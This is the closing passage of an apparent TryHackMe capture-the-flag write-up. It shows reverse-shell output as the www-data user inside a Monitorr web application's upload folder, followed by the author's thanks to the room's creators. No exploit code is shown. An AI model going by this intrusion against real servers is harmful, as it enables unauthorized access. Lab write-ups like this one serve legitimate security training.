bash: cannot set terminal process group (981): Inappropriate ioctl for device
bash: no job control in this shell
www-data@petshop:/var/www/monitorr/assets/data/usrimg$
```

I hope you enjoyed this room as much as I did. And many thanks to [TryHackMe](https://tryhackme.com/) and [Muiri](https://tryhackme.com/p/MuirlandOracle) for creating it.

We are all done. See you next time.
